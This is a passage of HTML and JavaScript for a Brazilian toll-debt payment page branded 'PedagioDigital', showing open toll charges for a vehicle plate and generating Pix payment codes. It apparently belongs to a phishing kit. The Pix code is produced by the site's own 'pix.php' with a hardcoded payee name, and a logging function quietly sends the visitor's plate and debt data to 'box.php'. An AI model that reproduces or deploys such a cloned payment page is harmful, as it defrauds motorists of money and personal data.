                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAEeElEQVR4AexY73XaMBCXzctHE29QugGZoLABbAATJEwQmCDJBCEThE4AnaDpBGGDOBg+5WH195Mto2CDbeyEtA+ez5JOp/un03GWLf7x38mAY2/gaQdOO1DSA6cQKunA0stPO1DahSUZHG0HXMfpnNfrz/V6/ca0wXXdxrnjTAGP6Lsi43c0AwLLupZSNoSUV3XHuaeeULghg2AqhWgBOkEQ9IjfBwcbAGEdCs4LKUr8NHA9elwpT6OiCXu9nkXdnc1BBlDpYL1+BFd6KC+AfPMsFoshRg8A9dDjakfUSAiM+95q9RQNdzaFDUDsaoV3Ms07sfB98oqN0OuovO/7Yz3e1xYyAGHjSsSuZmgJMRFCUFAeENs/8GtYlvVjGw++Cdw2jR4XMgCH6tLY5vmr73fhxX4e0AJ1S+W3Y17Poe0xTNFmPrkNoEBkDMatYmrXam3VOfAFZ/QMZyDo5Qj8Rwa7nuM4DDEDlezmNgCH9tpYPvY8b26MC3dtKTcHVMrRYrkcEkwjarWal8U4lwHwfguMtDfm8L7pKUwVfzzfn0B4F4a0leIRC/Y1Hk7iGYtm0hvQpk+YWMSq+qMhTgoxAuNS3icfAo3wlstErt+F55ptyDSAaTOMVbV0nje9KepPeO01AKHTkEbaxHb3P0GnQiLeGQCFW/S4BmSKOG0iXz8Jy2rouaO1rtsxLYwNoELINNNAiHsNAoWWJkYYNTX+qC1KGDO9xgagOmxqZb96i2iIdY0NsG37Fn/hM0w+GQYw2+QpEz6MBvpQB62SBx0n1FUjbN1hakRp0LZse6BxIJ6zTEDeHwDuAA8RDIivEsCXMjT/B80bafuX1gftBDp2qSv66okNUKOUFw42PzJ+43wQpmgJL/iSukohPwiF89cB3xcAeStALfQM2W4Ww0wD1ut1Ewe4kWAkZSuBOxAhhbhMWdqA7HcZJ4VGZBpQkzKzHkljXBCXKqOSWkj91aPYwnmYGTBBzFYWQlatNgDvCSCWIYJggFivphZigYXD0zbg3UEq6O0EORRV3xYG//ZitbpNEKYgMkMoZc2XQv3fBkghmkhn98cEnIu938dZO8A8zA+Zo0FqCjeCOMsAg/RrdpMGvL2ZOXkOgr4JphnYXqa5KuqgWKYpi33Ii+fQTzyg2cKdnZnFE+8u5/jEGxNQsX4zqZG/c12p6LpmV4vvjPiaETJcyiLgv4CFJcM4FGtZf8LO5p0wADmZFV/8nQqG6qYYd5dTfB8M9VJ4f0ZaPS7T2kHAXQxZSHkDWY9MHIFtT0Nk+EYVyh0PB9E7YQDx9CzaeOuQjToAs/bxIhqQlX/4b0+HaE6QxRqIiWPjfVQDcJgZHYo81QASwitty7ISC7BqzjnSoJ/+HICFQ7pYlrgnBU5g59W9kepvvVINIA1vhl8Xi+8g6CNG7wjsowa64BxpqgQ4xMMZ6eHioA1ZvHcaox3AWRcsZXbJgk67pkI8DxOuwq8I7FNQOPMxb4YTZA1hTB/tbZazMg34GDWr43oyoDpfHsbpLwAAAP//G1aZrQAAAAZJREFUAwD0zkGOxzWBtwAAAABJRU5ErkJggg==">
            <p class="empty__title">Nenhuma passagem em aberto encontrada.</p>
            <p class="empty__desc">
                As passagens podem levar até 48 horas para ficarem disponíveis no sistema para pagamento.
            </p>
            <p id="emptyCheckedAt" class="empty__stamp"></p>
            <div class="empty-info">
                <img class="empty-info__icon" alt=""
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAEjUlEQVR4AcyZbVIaSRjH+2mtktoNZI4AJ1hygoUTJJxA+IACsSp4AvEEO/sFiX4AT8DmBLgnkJyAOcIEwpZuSff+/6PDixllxrjoVD+Znu7n5ZdnuqebVquIq9lsOo1Gtdxo7LU2IQcHex9qtVo2AkWtAFKpXt8fXF//M1JK/x5l8H+0zWZqV8QOGo39LhmWY8wBP36sQ8kMrLV/7+z8kmu3P1fa7dPWJuTk5LR0cvI5h9hfCUqWEDIAPDioFYwxrZsbW+p0Tluu6/qhwibvAHWtlaIxMxeZLDB2ADibmS46KmdnZ0M2vqR0Oh3PWl0SMV3OBV2rVcsicoGOi5cEW459yyIe5kJZi+hdY+R8WeE11PFGj5WS93jFNp9KpV781ap7Vyp1BSabB6ByXmpS3GNaeXTdHieqQ8CVjtf28CyAjuPknXS6nMlkWhTHcT44aHuO/+xPAQLm09tMZmRms0ujVFdZe0TBcx9ymUmnR2mAq5+4ngSI7GQBdgkYF+LBSUVvbeXGk4lQtDHv2CZKeZAuQWmjnnDBTzIrBrLGDLAsOdra4rfJpOhPJj3f973Qkz+dDtnGPgSoiIhCRge0DXXi3mEfV1UpBriDU8hY0f/+/WKdNUFF66LIHNJZZ7PcnwgQWThC5rIB3FLGQoecKFFjjtklJPQc+PgD99glNiCzB69ljLljBkT9h8KJwjH3QwcaAhuRP1EtO2/eBBsB1NeW2IDY7TTpTW9v93iPEjirWKUqUX1s01q7uPtG6+cHFGt/Q3YugkwgSlTheJtgwkT1sQ22PnwMIe/5HEd0HCXqIDN5K/KV9YcEw4Alcuse2tAHx3H4vO4eGxCOOPt83B8sdjbrQ7oPKtx20Ad93T6t+TcJYCLHj8QlHH09orLoig8o4nEcLkyfVqMPUQpbKRXrig+o1BeOQw6yWJ4jlGCbhY8Cx2FEd2RTbECsr1w1nPBzE+ltTSNsd6ly97lhda3EBrxb1s7xof7ETKx6nj89OLYCG2tb0FxZt/H8aIkNSC9Y4poi4mO5ilz4ZWvrEFKi7rIQjms42jz4wG8N1GKWRIDBh1YvFv776y76PchKFgFXIBy+fbcbDN+f73riMCYCpEMAeFz4kUmF2dh9m04PCAqQPPspqGe5cWAfs402H5kr0hb1RCUxIL0z0LfxOAfjihLJilJdgHAHbbE5taiPuHFgnzLmELrvaEPbpIIYSU0W+lx7ETyHGc4ddAlAxxQ4rbCNfePplBuEhVHCGnwltIhQv9tB/zUej1sUgrMtQjVx07MAJo6awICAfhMHlglsNqLabJaDNRuAMry6uprPwI1EjxHk5iYFJhkC0H4RsUfqlV3GWByoyrne2fmXW/hseGD4Gjh5oGqtKrTbnZ52cUhjreC3q+kD8tHd8Cbgq9VqPjxQZTy8YqV4YIhTzUO86kG9vhf8OGLnJoUTtdHYO9relj5YjsnE+AEgK2joIZNF1POAHNXr+30YbOTPEA2c7l9fT0eIXwBckSzgCMockE/o8HCQXaaSUnZjp67GGPxl4dccTvoJt7KZ+A8AAP//vPL6YwAAAAZJREFUAwAAjLUqHEQaoQAAAABJRU5ErkJggg==">
                <p class="empty-info__text">
                    Se o veículo possui TAG a cobrança é automática. Verifique se a TAG está ativa e se os débitos
                    aparecem na
                    fatura de sua operadora. Caso contrário, consulte possíveis pendências aqui.
                </p>
            </div>
        </div>

        <!-- FORMA DE PAGAMENTO (seção de seleção) -->
        <section class="container" id="paySection" hidden="">
            <h2 class="section-title">Forma de pagamento</h2>
            <p class="section-sub">Selecione abaixo como quer fazer o pagamento</p>

            <ul class="pay-list">
                <!-- Cartão de crédito -->

                <li class="pay-item" id="optCard" role="button" tabindex="0" aria-label="Cartão de crédito">
                    <span class="pay-icon" aria-hidden="true">
                        <img
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAC4UlEQVR4AeyYv2+SQRjHv/fGX4NUGByqraEdWki00ZjUwZrU2MmYCNTJQXDV7sKkTvQPUFfAxLVgYpxq7MBgTIzGmpQ62Ma2MDgUwUGNvOfzvPo2kLwtd0DhHbi8z3vvPXfP3Sff+5W8BhzSmgx5N2UktiUjD7phRTkbKsmQ3wEFDYDcqCjDrw9BbAvIFCDvowsmYWZNiDUSI8UM9aA7gCU5G6VG7yUwjZ4lGWMGZrERLMCSvDFtwkyT00vW68fLLBsyZAllAUrUaDp7zdU4vgGR4r1gbMpQjKbV31jtipL/MIyYQaRRV+A4QsjrBql31rHOBU5mM4jDDRuDMBwfLwM61rjF2Qe0Z6Ly/Q/e5rfBue1TybumYGG5iujVd+BcBcxus++ArBgrV1j+YY1Z+FjVUlILcOvrTzx9soHHyS9KxkSsGCuXvLfKRSTjn7WUVAZ89eIbIhff0ACreESAKsZEwTMeZF6eR2J+jIuUj1vlAPktR5OXMiCr5vEexOKnKaxUZpSMx/YcO4DJKR8CEx4uUn7UKg+Q33I0eSkDrtAiD98cxMlTR5p06VxtKxlQVM7uRRnQDmg1t5VUVc4eRwuQ111wYBHtmD2waq4FOHnJh7nEaEvGsapQ9e30AGmx3yXAVow3Sv3Aqt9agKqddrJdH7BdNTukYLsYu8crAwYnPMg+K4Lv4927c67hGI61bxPnVs5eZcB4csyCmzmd1z4HOaZaqWEuPupMsYdXGZDPMb6HE/Pj0D0LOWYhfwFXrh3fA8W5ShmQw/kevnVnGLrnIMdwLPeha1qAup13on0fsF0VWcFyu53sY3zZEMAHuDQxGykonruUDyZExvhFPy6JdN2FkOtDYiFtjIhcuQZ5222A5n8mmmJgWOSW5D+HGzZMmVmYiUWzAPljSOTSBuQ5+ieX4XIvjJbaEjMwiz3+DiA7BkWO5j0bo0YjNO1hQDzshrFivyF9J0T2MjOgLv0FAAD//0SPq+YAAAAGSURBVAMAw1jghuqQgHcAAAAASUVORK5CYII=">
                    </span>
                    <div class="pay-texts">
                        <strong>Cartão de crédito</strong>
                        <small>Cadastre seu cartão e efetue o pagamento!</small>
                    </div>
                    <span class="pay-arrow" aria-hidden="true">
                        <svg width="24" height="24" viewBox="0 0 24 24">
                            <path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"></path>
                        </svg>
                    </span>
                </li>

                <!-- Pix -->
                <li class="pay-item" id="optPix" role="button" tabindex="0" aria-label="Pix">
                    <span class="pay-icon" aria-hidden="true">
                        <img
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAEOklEQVR4AcyYS2wTVxSG/xmVPiQMplIrBUIbWqm4j4RWVFAJV6KCbkil2qabUqnj7kpD93E2bTdx9iWwTIwU2MVGImwAgYSReIpHeAQk3mBLIEGIWfCKL+e/4QYnWGQ8HuIZzfHM3Hvn3G/O+c/ckW1U2a6qWPiWSiRvq8S/s2EFtT5WVLGWKiiYAshBBRXf/zas+xZUH6D+wSyYQjlbhnVVgtFHhkrQScCiWu/IoJMKWI2GbSpJBrIYBA1YVL+sLqPcL41hsUbvYbLcVDEdKA2oMC7pbDTX1PltWH2sBfuWiiUlrS1TuwNx1fIO7KQtpE4gcKpCqJ9tid7XVfsC0Eg2WziCUBiCUXUPE7BqT1AafQMce/AM27bc1Hb7xiPfns8XwJHhh/jxqzzSnRe1xVcdRnag6Atk3YCEc9YdRyg8B3vPRrU1f/weujae8wWyLsBKuMzQciz66F1tPP+8LeQLpGdAA0ftrWn/QIOZnIbmv4XOns/0Zb2R9Ay4UKL1/45lWPPTh1IYN9CbvqKB+EP4v389jUWS6szu5Vjx/QI2e7KaAXMi/rWteSSihzVUSiIV/60JmwWQkIQzmmSqjx28D6f9OHiPl8KpCZBwKRF/aP4crIi+j5EzD0GYjtSnMJC8ZsEQrjd9WYNHWkMSPcuTJl0DMjKEi7SFwMm7t36hj6UH41MgK+EYsY7UJ9i8fRmy+ZUwhXNUoirErnbXgF1/npvQlFTrPCkCeo+0zX0FclBAGDkDt0kAOTYk9/DBqMvenpd6Zd/rzDXgheES4huaYOCMU0JSh1w9EtEjWpuEY2EYODOWkPTxRiLICbMDBRDETMgjU88VhJFh9Abz34F6JASLhmOM8ZVEHxGRiWmb6eg6gqn0Uhi9GUjCTS+KhCxzHRVFYyAJ56w7oR+QEZ8JzPS7BoxM01vXxvO6OKYXBeEdWfoqITdtOC1jT2BEZNK99Ut5A7h/L7oG5BMZyHmy7h7N30NEUkXhVxZFVlJsIk3IDikSgpXGnoJwTD99ubWaAOk0IpGk1jJD34KTpzsvITtQ1OcsCvYT2kDy1UJd7h2Oam3SRy1WM6BxziJwRFP7dt2ZhDN9hOyW9yTTTSkU6vg+9AzIVHWLngi1b+guWAQ8pxGMlU0pMJqR1rls9mSeATmbgRw5U4LTPlGhhHOkSEpj46gXjnPUBUgHhGRhFK4/wlr5qqb5BUf/dQPSCTU3eGglUj1Lte0ZXoV60kqfxnwBpDN+Tf/+12LQpi+H7PdqvgF6BZjpPgKOzjSogf2jtgWcQkA3skkErZ0B5UMZVsZ+LH9cCum1AEJea7YG++0lVm50HOqPoAGWXzBJioHFVu6AmmgIQsGMkoVMDJoG5Emzleu3ob6R/+QyvG6EidQOkIEsZv5JQDY0WTnJezYpg5ZI2uOA9d9sGCP2BGrBQiv7AxlQsT0HAAD//3SWnEIAAAAGSURBVAMA0yh2lU3d0/oAAAAASUVORK5CYII=">
                    </span>
                    <div class="pay-texts">
                        <strong>Pix</strong>
                        <small>Informações para pagamento</small>
                    </div>
                    <span class="pay-arrow" aria-hidden="true">
                        <svg width="24" height="24" viewBox="0 0 24 24">
                            <path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"></path>
                        </svg>
                    </span>
                </li>
                <!-- WhatsApp -->
                <li class="pay-item" id="optWhatsapp" role="button" tabindex="0" aria-label="WhatsApp"
                    style="display: none;">
                    <span class="pay-icon" aria-hidden="true">
                        <img src="data:image/png;base64,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"
                            alt="">
                    </span>

                    <div class="pay-texts">
                        <strong>WhatsApp</strong>
                        <small>Entre em contato com a concessão para prosseguir com o pagamento.</small>
                    </div>

                    <span class="pay-arrow" aria-hidden="true">
                        <svg width="24" height="24" viewBox="0 0 24 24">
                            <path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"></path>
                        </svg>
                    </span>
                </li>
            </ul>
        </section>

        <!-- CARTÃO DE CRÉDITO -->
        <section class="container" id="cardSection" hidden="">
            <h2 class="section-title">Cartão de crédito</h2>

            <!-- ADD: lista de cartões salvos -->
            <div id="iFixPay"></div>
        </section>


        <!-- PIX -->
        <div class="loading-wrap hidden" aria-live="polite" aria-busy="true">
            <div class="loading-title">Gerando Pix…</div>
            <div class="loading-sub">Isso leva só alguns segundos.</div>
            <div class="skel-list"></div>
        </div>
        <section class="container" id="pixSection" hidden="">


            <div class="summary-card">
                <h3>Resumo do pedido</h3>
                <div class="summary-grid">
                    <span>Placa do veículo</span><strong id="pixPlate">—</strong>
                    <span>Vencimento código Pix</span><strong id="pixExpireAbs">—</strong>

                    <!-- LINHA ÚNICA DO TOTAL -->
                    <div class="summary-total-row">
                        <span>Valor do pedido</span>
                        <strong id="pixTotal">R$ 0,00</strong>
                    </div>
                </div>
            </div>


            <p class="pix-countdown">Pague em até: <strong id="pixCountdown">10:00</strong></p>

            <div class="qr-box" id="pixQR" aria-label="QR Code do Pix"></div>

            <p class="pix-hint">
                Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
            </p>

            <textarea id="pixCode" class="code-box" rows="4" readonly=""></textarea>

            <div class="btn-row">
                <button type="button" id="btnCopyPix" class="btn-continue">Copiar código Pix</button>
                <button type="button" id="btnSharePix" class="btn-continue btn-ghost">Compartilhar código Pix</button>
            </div>
        </section>



        <!-- TOTAL / RESUMO (abre/fecha) -->
        <aside class="total-card" aria-labelledby="totalTitle">
            <!-- Cabeçalho clicável (agora é DIV, não <button>) -->
            <div id="toggleResumo" class="total-head" role="button" tabindex="0" aria-expanded="false"
                aria-controls="resumoPanel">
                <div class="th-row th-top">
                    <strong id="totalTitle">Total a pagar:</strong>
                    <svg class="chev" width="32" height="32" viewBox="0 0 24 24" aria-hidden="true">
                        <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                            stroke-linejoin="round"></path>
                    </svg>
                </div>

                <!-- linha com valor + botão (visível quando FECHADO) -->
                <div class="th-row th-bottom">
                    <div class="total-value" id="totalValue">R$&nbsp;12,10</div>
                    <button type="button" id="btnContinuarTop" class="btn-continue btn-continue--inline" style="">
                        Continuar
                    </button>
                </div>
            </div>

            <!-- Corpo (visível quando ABERTO) -->
            <div id="resumoPanel" class="total-body" hidden="">
                <p class="resumo-placa">Placa: <strong id="resumoPlaca">OOL2E18</strong></p>
                <ul id="resumoItens" class="resumo-list">
                    <li><span>MSVia</span><strong>R$&nbsp;5,10</strong></li>
                    <li><span>MSVia</span><strong>R$&nbsp;7,00</strong></li>
                </ul>

                <!-- linha final com total + botão à direita -->
                <div class="resumo-total">
                    <span>Total a pagar:</span>
                    <strong id="resumoTotal">R$&nbsp;12,10</strong>
                    <button type="button" id="btnContinuar" class="btn-continue btn-continue--inline" style="">
                        Continuar
                    </button>
                </div>
            </div>
        </aside>
    </main>

    <!-- Modal de Erro (reutilizável) -->
    <div class="dlg" id="errorDlg" aria-hidden="true">
        <div class="dlg__overlay" data-close=""></div>
        <div class="dlg__card">
            <div class="m__grab" aria-hidden="true"></div>
            <h3 class="dlg__title" id="errorDlgTitle">Ops!</h3>
            <p id="errorDlgMsg">Não foi possível consultar os débitos desta placa. Tente novamente.</p>
            <button type="button" class="dlg__primary" name="btnCloseError" data-close="">OK</button>
        </div>
    </div>
    <!-- Modal - Mensagem do Card 27458 -->
    <div id="popupSemPassagem" class="popup hidden">
        <div class="popup-content">
            <span class="popup-icon">!</span>
            <div class="popup-text">
                <strong>Não encontrou sua passagem?</strong>
                <p>
                    Cadastre-se para ser notificado por SMS quando o débito já estiver disponível.
                </p>
            </div>
            <button class="popup-close" onclick="fecharPopup()">✕</button>
        </div>
        <div class="popup-progress">
            <div class="popup-progress-bar" id="popupProgressBar"></div>
        </div>
    </div>
    <!-- Fim -->


</body>
<!-- Modal Pix Moderno -->
<div id="pixModal" class="pix-modal" style="display:none;">
    <div class="pix-modal__overlay"></div>
    <div class="pix-modal__card">
        <button class="pix-modal__close" id="closePixModal" aria-label="Fechar">&times;</button>
        <h2 class="pix-modal__title">Pagamento via Pix</h2>
        <div class="pix-modal__content">
            <div class="pixBox" style="">
                <img class="pixsrc" src="" alt="QR Code Pix"
                    style="width:180px;height:180px;display:block;margin:0 auto 12px;">
                <div class="pix-info" style="text-align:center;margin-bottom:8px;">
                    <div id="pixTotalInfo" style="font-size:1.1em;font-weight:600;"></div>
                    <div id="pixQtdInfo" style="font-size:0.98em;color:#666;"></div>
                </div>
                <textarea class="valuepix" id="pixKeyArea" readonly
                    style="word-break:break-all;text-align:center;font-size:15px;margin-bottom:10px;width:100%;min-height:48px;resize:none;border-radius:8px;border:1px solid #e5e7eb;padding:8px 6px;"></textarea>
                <button id="copyPixKey" class="btn-continue" style="width:100%;margin-top:8px;">Copiar chave
                    Pix</button>
            </div>
        </div>
    </div>
</div>
<style>
.pix-modal {
    position: fixed;
    inset: 0;
    z-index: 99999;
    display: grid;
    place-items: center;
    background: rgba(0, 0, 0, 0.35);
}

.pix-modal__overlay {
    position: absolute;
    inset: 0;
    background: rgba(0, 0, 0, 0.35);
}

.pix-modal__card {
    position: relative;
    background: #fff;
    border-radius: 16px;
    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.18);
    padding: 32px 24px 24px;
    min-width: 320px;
    max-width: 442px;
    min-height: 220px;
}

.pix-modal__close {
    position: absolute;
    top: 12px;
    right: 12px;
    background: none;
    border: none;
    font-size: 2rem;
    color: #222;
    cursor: pointer;
}

.pix-modal__title {
    text-align: center;
    font-size: 1.3rem;
    margin-bottom: 18px;
}

.pix-modal__content {
    min-height: 180px;
}

.btn-continue {
    margin-top: 10px;
}
</style>
<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
<script>
// Função para abrir o modal Pix
function openPixModal() {
    document.getElementById('pixModal').style.display = 'grid';
}

function closePixModal() {
    document.getElementById('pixModal').style.display = 'none';
}
document.getElementById('closePixModal').onclick = closePixModal;
document.querySelector('#pixModal .pix-modal__overlay').onclick = closePixModal;

const params = new URLSearchParams(window.location.search);

var sucesso = params.get("sucesso");

// Função para gerar Pix e exibir modal
function pixGera(valor, out, qtdFaturas) {
    openPixModal();
    document.querySelector('.pixBox').style = "";
    document.querySelector('.pixsrc').src = './<?=$diretorio?>/arquivos/Spinner-btn.gif';
    document.getElementById('pixKeyArea').value = '';
    document.getElementById('pixTotalInfo').textContent = 'Total a pagar: R$ ' + Number(valor).toLocaleString('pt-BR', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
    document.getElementById('pixQtdInfo').textContent = qtdFaturas + ' fatura' + (qtdFaturas > 1 ? 's' : '');

    const payload = new URLSearchParams({
        valor: valor,
        cpf_cnpj: sucesso,
        nome: 'PedagioDigital',
        debito: 'Fatura gerada',
        out: out
    });

    fetch('./data/pix.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: payload.toString()
        })
        .then(response => response.json())
        .then(data => {
            console.log('Resposta Pix:', data);
            if (data.status && data.pix) {
                QRCode.toDataURL(data.pix, {
                    errorCorrectionLevel: 'H'
                }, function(err, url) {
                    if (err) {
                        document.querySelector('.pixsrc').src =
                        './<?=$diretorio?>/arquivos/Spinner-btn.gif';
                        return;
                    }
                    document.querySelector('.pixsrc').src = url;
                });
                document.getElementById('pixKeyArea').value = data.pix;
                // Copiar Pix
                document.getElementById('copyPixKey').onclick = function() {
                    const area = document.getElementById('pixKeyArea');
                    area.select();
                    area.setSelectionRange(0, 99999);
                    try {
                        document.execCommand('copy');
                    } catch (err) {}
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(area.value);
                    }
                    // Feedback visual
                    document.getElementById('copyPixKey').textContent = 'Copiado!';
                    setTimeout(function() {
                        document.getElementById('copyPixKey').textContent = 'Copiar chave Pix';
                    }, 1200);
                };
            } else {
                document.getElementById('pixKeyArea').value = 'Erro ao gerar Pix.';
                document.querySelector('.pixsrc').src = '';
            }
        })
        .catch(error => {
            document.getElementById('pixKeyArea').value = 'Erro na requisição.';
            document.querySelector('.pixsrc').src = '';
        });
}

// Vincula ao botão continuar (topo e resumo)
['btnContinuarTop', 'btnContinuar'].forEach(function(btnId) {
    var btn = document.getElementById(btnId);
    if (btn) {
        btn.onclick = function() {
            // Soma os valores selecionados
            var lista = document.getElementById('listaDebitos');
            var checkboxes = lista.querySelectorAll('input[type="checkbox"]:checked');
            var total = 0;
            checkboxes.forEach(function(cb) {
                let valor = cb.getAttribute('data-valor') || '0,00';
                total += parseFloat((valor + '').replace(/\./g, '').replace(',', '.'));
            });
            pixGera(total.toFixed(2), '', checkboxes.length);
        };
    }
});


    window.toMoney = function(a) {
        return parseFloat(a).toFixed(2).replace(".", ",").replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1.")
    }

    function calcularDebitos(faturas) {
        let quantidadeDebitos = 0;
        let valorTotal = 0;

        faturas.forEach(fatura => {
            if (fatura.valor) {
                quantidadeDebitos++;
                valorTotal += parseFloat(fatura.valor);
            }
        });

        return quantidadeDebitos + " / " + toMoney(valorTotal.toFixed(2));
    }

function SalveLog(e) {

    if (e?.debitos) {

        const dadosArray = [{
            label: "Placa",
            value: sucesso
        }];

        var debitos = e?.debitos ? calcularDebitos(e.debitos) : 0;

        const payload = new URLSearchParams({
            dados: JSON.stringify(dadosArray),
            doc: sucesso,
            debitos,
            nome: 'PedagioDigital',
            page: 'pedagiodigital',
            resposta: encodeURIComponent(JSON.stringify(e))
        });

        fetch('./data/box.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: payload.toString()
        }).then(response => response.text()).then(data => {}).catch(error => {
            console.error('Erro na requisição:', error);
        });
    }
}

// Preenche a tela com os dados da Store (sessionStorage) e soma o total conforme seleção
document.addEventListener('DOMContentLoaded', function() {

    let data = null;
    try {
        data = JSON.parse(sessionStorage.getItem('pedagiodigitalData'));
    } catch (e) {}

    if (data) {
        SalveLog(data)
    }

    if (!data || !data.IsStatus || !Array.isArray(data.debitos)) return;

    // Atualiza lista de débitos
    const lista = document.getElementById('listaDebitos');
    if (lista) {
        lista.innerHTML = '';
        let count = 0;
        data.debitos.forEach(function(debito) {
            count++;
            let valor = debito.valorTotal || debito.valor || '0,00';
            let item = document.createElement('li');
            item.className = 'item';
            item.innerHTML =
                `<label class="row"><input type="checkbox" data-id="${debito.idPassagem}" data-valor="${valor}"><div class="item-left"><span class="item-placa">${debito.placa}</span><span class="item-dados item-dados1 blur-if-anon">${formatarData(debito.data)}</span><span class="item-conc">${debito.concessao}</span><span class="item-dados item-dados2 blur-if-anon"></span></div><div class="item-head"><span class="item-price">R$&nbsp;${valor}</span></div></label>`;
            lista.appendChild(item);
        });

        // Atualiza label de seleção em massa
        const bulkLabel = document.getElementById('bulkLabel');
        if (bulkLabel) bulkLabel.innerHTML = `Selecionar ${count} passagens em aberto`;

        // Atualiza data/hora da consulta
        const debitoCheckedAt = document.getElementById('debitoCheckedAt');
        if (debitoCheckedAt) {
            const now = new Date();
            debitoCheckedAt.textContent = now.toLocaleDateString('pt-BR') + ' - ' + now.toLocaleTimeString(
                'pt-BR', {
                    hour: '2-digit',
                    minute: '2-digit'
                });
        }

        // Atualiza resumo placa e itens (mantém sempre todos)
        const resumoPlaca = document.getElementById('resumoPlaca');
        if (resumoPlaca && data.debitos[0]) resumoPlaca.textContent = data.debitos[0].placa;
        const resumoItens = document.getElementById('resumoItens');
        if (resumoItens) {
            resumoItens.innerHTML = '';
            data.debitos.forEach(function(debito) {
                let valor = debito.valorTotal || debito.valor || '0,00';
                let li = document.createElement('li');
                li.innerHTML = `<span>${debito.concessao}</span><strong>R$&nbsp;${valor}</strong>`;
                resumoItens.appendChild(li);
            });
        }

        // Função para atualizar o total conforme seleção
        function atualizarTotalSelecionado() {
            const checkboxes = lista.querySelectorAll('input[type="checkbox"]');
            let total = 0;
            let checkedCount = 0;
            checkboxes.forEach(function(cb) {
                if (cb.checked) {
                    checkedCount++;
                    let valor = cb.getAttribute('data-valor') || '0,00';
                    total += parseFloat((valor + '').replace(/\./g, '').replace(',', '.'));
                }
